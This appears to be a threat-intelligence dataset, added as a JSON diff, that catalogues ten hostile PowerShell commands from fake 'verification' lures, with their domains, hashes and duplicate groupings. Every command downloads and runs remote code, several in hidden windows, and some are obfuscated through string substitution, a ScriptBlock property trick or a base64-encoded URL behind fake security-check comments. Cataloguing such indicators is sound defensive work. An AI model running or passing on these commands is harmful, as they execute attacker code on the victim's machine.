@@ -1,0 +1,117 @@
+{
+  "schema_version": 1,
+  "commands": [
+    {
+      "label": "pt1",
+      "case_id": "20260825-command-pt1",
+      "domain": "fingerprint-verification.info",
+      "command": "powershell -w h \"iex(irm 'fingerprint-verification.info/b65e021a394660c5'); Start-Sleep -Seconds 24\"; exit;",
+      "command_sha256": "ad205fd0791c387ae175527f61eeafd7f56ef6458cfbfa14cb790135136d52f5",
+      "duplicate_group": [
+        "pt1"
+      ]
+    },
+    {
+      "label": "pt2",
+      "case_id": "20260825-command-pt2",
+      "domain": "rrewardgoldshop.com",
+      "command": "[System.Diagnostics.Process]::Start('powershell',(&{$yb='';@(('iex(wgejt jhtjztps:zz//zrzzezwa' -replace '[zj]'),'nnnrdnn'.Trim('n'),'goljshop.com/q)'.Replace('j','d'))|%{$yb+=$_};$yb}))",
+      "command_sha256": "a3b79eef4fe44ac7b4caff424ad0cc3512d703b87c74a23e366a3bf65010cded",
+      "duplicate_group": [
+        "pt2"
+      ]
+    },
+    {
+      "label": "pt3",
+      "case_id": "20260825-command-pt3",
+      "domain": "makeverizyjar.info",
+      "command": "powershell -w h \"iex(irm 'makeverizyjar.info/3aaef5a225beec2c' -UseBasicParsing)\"; exit",
+      "command_sha256": "5feb1ae28bba2dab1f4ef79911a36d2f467f3dd2c3fb0bc51a0a5a12db4ffe1a",
+      "duplicate_group": [
+        "pt3"
+      ]
+    },
+    {
+      "label": "pt4",
+      "case_id": "20260825-command-pt4-pt8-pt9",
+      "domain": "imagehopeag.com",
+      "command": "powershell -w 1 -c \"iEX([System.Net.WebClient]::new().DownloadString('https://imagehopeag.com/hex/traffic'))\"",
+      "command_sha256": "bb5c1b1bda6aec766c1d3091f0a48e6b56774ae6530c94c0d93603f5457a4bed",
+      "duplicate_group": [
+        "pt4",
+        "pt8",
+        "pt9"
+      ]
+    },
+    {
+      "label": "pt5",
+      "case_id": "20260825-command-pt5-pt6-pt7",
+      "domain": "spielportal.com",
+      "command": "powershell -c \"$a=irm 'spielportal.com/cj5JpRGuScm5B9ok7';$o=[pscustomobject]@{v=1};$o|Add-Member ScriptProperty p ([ScriptBlock]::Create($a));$o.p|Out-Null\"",
+      "command_sha256": "5b991f36902bf1f536bcc3e43298e4b7f78fb95184d88dfeaf4cd6f3cf590fff",
+      "duplicate_group": [
+        "pt5",
+        "pt6",
+        "pt7"
+      ]
+    },
+    {
+      "label": "pt6",
+      "case_id": "20260825-command-pt5-pt6-pt7",
+      "domain": "spielportal.com",
+      "command": "powershell -c \"$a=irm 'spielportal.com/cj5JpRGuScm5B9ok7';$o=[pscustomobject]@{v=1};$o|Add-Member ScriptProperty p ([ScriptBlock]::Create($a));$o.p|Out-Null\"",
+      "command_sha256": "5b991f36902bf1f536bcc3e43298e4b7f78fb95184d88dfeaf4cd6f3cf590fff",
+      "duplicate_group": [
+        "pt5",
+        "pt6",
+        "pt7"
+      ]
+    },
+    {
+      "label": "pt7",
+      "case_id": "20260825-command-pt5-pt6-pt7",
+      "domain": "spielportal.com",
+      "command": "powershell -c \"$a=irm 'spielportal.com/cj5JpRGuScm5B9ok7';$o=[pscustomobject]@{v=1};$o|Add-Member ScriptProperty p ([ScriptBlock]::Create($a));$o.p|Out-Null\"",
+      "command_sha256": "5b991f36902bf1f536bcc3e43298e4b7f78fb95184d88dfeaf4cd6f3cf590fff",
+      "duplicate_group": [
+        "pt5",
+        "pt6",
+        "pt7"
+      ]
+    },
+    {
+      "label": "pt8",
+      "case_id": "20260825-command-pt4-pt8-pt9",
+      "domain": "imagehopeag.com",
+      "command": "powershell -w 1 -c \"iEX([System.Net.WebClient]::new().DownloadString('https://imagehopeag.com/hex/traffic'))\"",
+      "command_sha256": "bb5c1b1bda6aec766c1d3091f0a48e6b56774ae6530c94c0d93603f5457a4bed",
+      "duplicate_group": [
+        "pt4",
+        "pt8",
+        "pt9"
+      ]
+    },
+    {
+      "label": "pt9",
+      "case_id": "20260825-command-pt4-pt8-pt9",
+      "domain": "imagehopeag.com",
+      "command": "powershell -w 1 -c \"iEX([System.Net.WebClient]::new().DownloadString('https://imagehopeag.com/hex/traffic'))\"",
+      "command_sha256": "bb5c1b1bda6aec766c1d3091f0a48e6b56774ae6530c94c0d93603f5457a4bed",
+      "duplicate_group": [
+        "pt4",
+        "pt8",
+        "pt9"
+      ]
+    },
+    {
+      "label": "pt10",
+      "case_id": "20260825-command-pt10",
+      "domain": "triapfog.com",
+      "command": "<# Security verification #> <# Completes the browser challenge for this device. #> <# Ticket 9D9527B1E4AE | BC7ED72F-6EC5 #> $ErrorActionPreference='SilentlyContinue';$ProgressPreference='SilentlyContinue';try{$Host.UI.RawUI.WindowTitle='Verification'}catch{};try{[Net.ServicePointManager]::SecurityProtocol=[Net.SecurityProtocolType]::Tls12}catch{};Write-Host 'Completing verification...' -ForegroundColor DarkYellow;function Confirm-SecuritySession { <# bind one-time session ticket #> $u=[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('aHR0cHM6Ly90cmlhcGZvZy5jb20vc2VjdXJpdHkvYzhwcHdveWU1MA==')); irm $u | iex };Confirm-SecuritySession",
+      "command_sha256": "1a44a4d00493aca1e833ed54f60d07141c42c196b81951fe31a6a3bc69842da8",
+      "duplicate_group": [
+        "pt10"
+      ]
+    }
+  ]
+}
